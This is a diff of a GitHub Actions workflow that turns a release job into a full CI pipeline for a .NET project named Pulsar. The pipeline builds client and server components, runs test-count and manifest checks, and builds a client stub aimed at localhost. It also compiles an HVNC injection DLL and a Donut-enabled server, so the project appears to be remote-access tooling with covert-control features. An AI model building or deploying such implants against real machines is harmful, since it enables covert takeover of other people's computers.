@@ -1,74 +1,364 @@
-name: Pulsar .NET 9.0 Windows Release
+name: Pulsar CI
 
 on:
+  push:
+  pull_request:
   workflow_dispatch:
 
+permissions:
+  contents: read
+
+concurrency:
+  group: pulsar-ci-${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: true
+
+env:
+  DOTNET_NOLOGO: true
+  DOTNET_CLI_TELEMETRY_OPTOUT: true
+  DOTNET_SKIP_FIRST_TIME_EXPERIENCE: true
+  DOTNET_ROLL_FORWARD: Major
+
 jobs:
-  build:
+  managed-builds:
+    name: Managed build - ${{ matrix.component }}
     runs-on: windows-latest
-    permissions:
-      contents: write
-      pull-requests: write
-      repository-projects: write
-
+    strategy:
+      fail-fast: false
+      matrix:
+        include:
+          - component: common
+            project: Pulsar.Common/Pulsar.Common.csproj
+          - component: client
+            project: Pulsar.Client/Pulsar.Client.csproj
+          - component: server
+            project: Pulsar.Server/Pulsar.Server.csproj
+          - component: admin
+            project: Pulsar.AdminClient/Pulsar.AdminClient.csproj
+          - component: relay
+            project: Pulsar.Relay/Pulsar.Relay.csproj
     steps:
-      - name: Checkout Repository
+      - name: Checkout
         uses: actions/checkout@v4
-        with:
-          submodules: true
-          fetch-depth: 0
 
-      - name: Setup .NET 9.0
+      - name: Setup .NET
         uses: actions/setup-dotnet@v4
         with:
-          dotnet-version: '9.0.x'
+          dotnet-version: 9.0.x
+
+      - name: Restore ${{ matrix.component }}
+        run: dotnet restore "${{ matrix.project }}"
+
+      - name: Build ${{ matrix.component }}
+        run: dotnet build "${{ matrix.project }}" --configuration Release --no-restore
+
+  tests:
+    name: Tests - ${{ matrix.framework }} (${{ matrix.expected }})
+    needs: managed-builds
+    runs-on: windows-latest
+    strategy:
+      fail-fast: false
+      matrix:
+        include:
+          - framework: net48
+            expected: 54
+          - framework: net9.0-windows
+            expected: 62
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: Setup .NET
+        uses: actions/setup-dotnet@v4
+        with:
+          dotnet-version: 9.0.x
+
+      - name: Restore tests
+        run: dotnet restore Pulsar.Common.Tests/Pulsar.Common.Tests.csproj
+
+      - name: Run all ${{ matrix.framework }} variants
+        run: >-
+          dotnet test Pulsar.Common.Tests/Pulsar.Common.Tests.csproj
+          --configuration Release
+          --framework ${{ matrix.framework }}
+          --no-restore
+          --results-directory TestResults
+          --logger "trx;LogFileName=${{ matrix.framework }}.trx"
+
+      - name: Require the complete ${{ matrix.framework }} test inventory
+        shell: pwsh
+        run: |
+          $path = Join-Path $PWD "TestResults/${{ matrix.framework }}.trx"
+          if (-not (Test-Path $path)) { throw "Missing test result: $path" }
+          [xml] $trx = Get-Content -Raw $path
+          $total = [int] $trx.TestRun.ResultSummary.Counters.total
+          $passed = [int] $trx.TestRun.ResultSummary.Counters.passed
+          if ($total -ne ${{ matrix.expected }} -or $passed -ne $total) {
+            throw "Expected ${{ matrix.expected }} passing ${{ matrix.framework }} tests; observed $passed/$total."
+          }
+
+      - name: Upload ${{ matrix.framework }} test results
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: tests-${{ matrix.framework }}
+          path: TestResults/*.trx
+          if-no-files-found: warn
+
+  contract-checks:
+    name: Builder, manifest, registration, and version checks
+    needs:
+      - managed-builds
+      - tests
+    runs-on: windows-latest
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: Setup .NET
+        uses: actions/setup-dotnet@v4
+        with:
+          dotnet-version: 9.0.x
+
+      - name: Build version and registration contract tests
+        run: >-
+          dotnet test Pulsar.Common.Tests/Pulsar.Common.Tests.csproj
+          --configuration Release
+          --framework net9.0-windows
+          --filter "FullyQualifiedName~Pulsar.Common.Tests.Build.BuilderCompatibilityTests|FullyQualifiedName~Pulsar.Common.Tests.Messages.MessageHandlerTests"
+          --results-directory TestResults
+          --logger "trx;LogFileName=contracts.trx"
+
+      - name: Require all builder, registration, and version contracts
+        shell: pwsh
+        run: |
+          [xml] $trx = Get-Content -Raw 'TestResults/contracts.trx'
+          $counters = $trx.TestRun.ResultSummary.Counters
+          if ([int] $counters.total -ne 18 -or [int] $counters.passed -ne 18) {
+            throw "Expected 18 passing contract tests; observed $($counters.passed)/$($counters.total)."
+          }
+
+      - name: Build a real managed stub and validate its manifest
+        shell: pwsh
+        run: |
+          $ErrorActionPreference = 'Stop'
+          $work = Join-Path $PWD 'ci-builder'
+          New-Item -ItemType Directory -Force $work | Out-Null
+
+          $certPath = Join-Path $work 'ci-builder.pfx'
+          $cert = New-SelfSignedCertificate `
+            -Subject 'CN=Pulsar CI Builder' `
+            -CertStoreLocation 'Cert:\CurrentUser\My' `
+            -KeyAlgorithm RSA `
+            -KeyLength 2048 `
+            -KeyExportPolicy Exportable `
+            -KeySpec Signature `
+            -NotAfter (Get-Date).AddDays(1)
+          try {
+            Export-PfxCertificate `
+              -Cert $cert `
+              -FilePath $certPath `
+              -Password ([System.Security.SecureString]::new()) | Out-Null
+          }
+          finally {
+            Remove-Item "Cert:\CurrentUser\My\$($cert.Thumbprint)" -ErrorAction SilentlyContinue
+          }
+
+          dotnet build Pulsar.Client/Pulsar.Client.csproj --configuration Release
+          $output = Join-Path $work 'client.exe'
+          dotnet run `
+            --project tools/stub-builder/StubBuilder.csproj `
+            --configuration Release `
+            -- `
+            -hosts '127.0.0.1:4783' `
+            -out $output `
+            -cert $certPath `
+            -template (Join-Path $PWD 'bin/Release/net9.0-windows/client.bin')
+          if ($LASTEXITCODE -ne 0) { throw "Stub builder failed with exit code $LASTEXITCODE." }
+
+          $manifestPath = "$output.manifest.json"
+          if (-not (Test-Path $manifestPath)) { throw "Builder did not emit $manifestPath." }
+          $manifest = Get-Content -Raw $manifestPath | ConvertFrom-Json
+          $protocol = ([regex]::Match(
+            (Get-Content -Raw 'Pulsar.Common/ProtocolVersion.cs'),
+            'Current\s*=\s*"([^"]+)"'
+          )).Groups[1].Value
+          $expectedHash = (Get-FileHash $output -Algorithm SHA256).Hash
+          if ($manifest.ProtocolVersion -ne $protocol) {
+            throw "Manifest protocol $($manifest.ProtocolVersion) does not match $protocol."
+          }
+          if ($manifest.OutputSha256 -ne $expectedHash) {
+            throw "Manifest output hash does not match the generated artifact."
+          }
+          if ($manifest.SettingsLayoutVersion -lt 1 -or [string]::IsNullOrWhiteSpace($manifest.EntryPoint)) {
+            throw "Manifest is missing settings-layout or entry-point metadata."
+          }
+
+  web-api-smoke:
+    name: Web API smoke
+    needs:
+      - tests
+      - contract-checks
+    runs-on: windows-latest
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: Setup .NET
+        uses: actions/setup-dotnet@v4
+        with:
+          dotnet-version: 9.0.x
+
+      - name: Run local Web API smoke
+        run: dotnet run --project tools/webapi-smoke/WebApiSmoke.csproj --configuration Release
+
+  admin-relay-smoke:
+    name: Admin relay smoke
+    needs:
+      - tests
+      - contract-checks
+    runs-on: windows-latest
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: Setup .NET
+        uses: actions/setup-dotnet@v4
+        with:
+          dotnet-version: 9.0.x
+
+      - name: Build Debug admin executable
+        run: dotnet build Pulsar.AdminClient/Pulsar.AdminClient.csproj --configuration Debug
+
+      - name: Run local admin relay smoke
+        run: dotnet run --project tools/admin-relay-smoke/AdminRelaySmoke.csproj --configuration Debug
+
+  native-hvnc:
+    name: Native HVNC x64
+    needs:
+      - web-api-smoke
+      - admin-relay-smoke
+    runs-on: windows-latest
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
 
       - name: Setup MSBuild
         uses: microsoft/setup-msbuild@v2
 
-      - name: Get Version
-        run: |
-          $version = (Get-Content Pulsar.Server/Utilities/ServerVersion.cs | Select-String 'Current = "([^"]+)"').Matches.Groups[1].Value
-          echo "VERSION=$version" >> $env:GITHUB_ENV
+      - name: Build x64 HVNC injection
         shell: pwsh
+        run: |
+          $solutionDir = "$($PWD.Path)\"
+          msbuild HVNCInjection/HVNCInjection.vcxproj /m /p:Configuration=Release /p:Platform=x64 "/p:SolutionDir=$solutionDir"
 
-      - name: Restore Dependencies
+      - name: Verify HVNC artifact
+        shell: pwsh
+        run: |
+          $artifact = 'bin/Release/net9.0-windows/HVNCInjection.x64.dll'
+          if (-not (Test-Path $artifact)) { throw "Missing HVNC artifact: $artifact" }
+
+      - name: Upload HVNC artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: hvnc-x64
+          path: bin/Release/net9.0-windows/HVNCInjection.x64.dll
+
+  native-donut:
+    name: Native Donut and server integration
+    needs:
+      - web-api-smoke
+      - admin-relay-smoke
+    runs-on: windows-latest
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: Setup .NET
+        uses: actions/setup-dotnet@v4
+        with:
+          dotnet-version: 9.0.x
+
+      - name: Setup MSBuild
+        uses: microsoft/setup-msbuild@v2
+
+      - name: Restore Donut-enabled server
+        run: dotnet restore Pulsar.Server/Pulsar.Server.csproj
+
+      - name: Build Donut-enabled server
+        run: dotnet build Pulsar.Server/Pulsar.Server.csproj --configuration ReleaseWithDonut --no-restore
+
+      - name: Verify Donut artifacts
+        shell: pwsh
+        run: |
+          foreach ($artifact in @(
+            'external/donut/donut.exe',
+            'bin/Release/net9.0-windows/donut.exe'
+          )) {
+            if (-not (Test-Path $artifact)) { throw "Missing Donut artifact: $artifact" }
+          }
+
+      - name: Upload Donut artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: donut-x64
+          path: bin/Release/net9.0-windows/donut.exe
+
+  release:
+    name: Manual Windows release
+    if: github.event_name == 'workflow_dispatch'
+    needs:
+      - native-hvnc
+      - native-donut
+    runs-on: windows-latest
+    permissions:
+      contents: write
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+        with:
+          fetch-depth: 0
+
+      - name: Setup .NET
+        uses: actions/setup-dotnet@v4
+        with:
+          dotnet-version: 9.0.x
+
+      - name: Setup MSBuild
+        uses: microsoft/setup-msbuild@v2
+
+      - name: Get version
+        shell: pwsh
+        run: |
+          $version = (Get-Content Pulsar.Server/Utilities/ServerVersion.cs |
+            Select-String 'Current = "([^"]+)"').Matches.Groups[1].Value
+          if ([string]::IsNullOrWhiteSpace($version)) { throw 'Could not read server version.' }
+          "VERSION=$version" >> $env:GITHUB_ENV
+
+      - name: Restore
         run: dotnet restore Pulsar.sln
 
-      - name: Build Solution
-        run: msbuild Pulsar.sln /p:Configuration=Release /p:Platform=AnyCPU
+      - name: Build solution
+        run: msbuild Pulsar.sln /m /p:Configuration=Release /p:Platform=AnyCPU
 
-      - name: Prepare Build Output
-        run: |
-          if (Test-Path "./bin/Release/net9.0-windows") {
-            Compress-Archive -Path "./bin/Release/net9.0-windows/*" -DestinationPath "pulsar-net-win64-${{ env.VERSION }}.zip"
-            Write-Host "Zipped net9.0-windows output"
-          } else {
-            Write-Host "Error: net9.0-windows output not found"
-            exit 1
-          }
+      - name: Package Windows output
         shell: pwsh
+        run: |
+          $output = 'bin/Release/net9.0-windows'
+          if (-not (Test-Path $output)) { throw "Missing release output: $output" }
+          Compress-Archive -Path "$output/*" -DestinationPath "pulsar-net-win64-$env:VERSION.zip"
 
-      - name: Upload Build Artifact
+      - name: Upload release artifact
         uses: actions/upload-artifact@v4
         with:
           name: windows-build-${{ env.VERSION }}
           path: pulsar-net-win64-${{ env.VERSION }}.zip
 
-      - name: Delete existing release
+      - name: Replace release
         env:
           GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
-        run: |
-          gh release delete Pulsar-v${{ env.VERSION }} --yes --cleanup-tag || echo "No existing release/tag to delete"
         shell: bash
-
-      - name: Create Release 
-        env:
-         GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
         run: |
-         gh release create Pulsar-v${{ env.VERSION }} pulsar-net-win64-${{ env.VERSION }}.zip \
-         -t "Pulsar-v${{ env.VERSION }}" \
-         -n "Automated build release for Pulsar v${{ env.VERSION }}" \
-         --draft=false \
-         --prerelease=false
-        shell: bash
+          gh release delete "Pulsar-v${VERSION}" --yes --cleanup-tag || true
+          gh release create "Pulsar-v${VERSION}" "pulsar-net-win64-${VERSION}.zip" \
+            --title "Pulsar-v${VERSION}" \
+            --notes "Automated build release for Pulsar v${VERSION}"
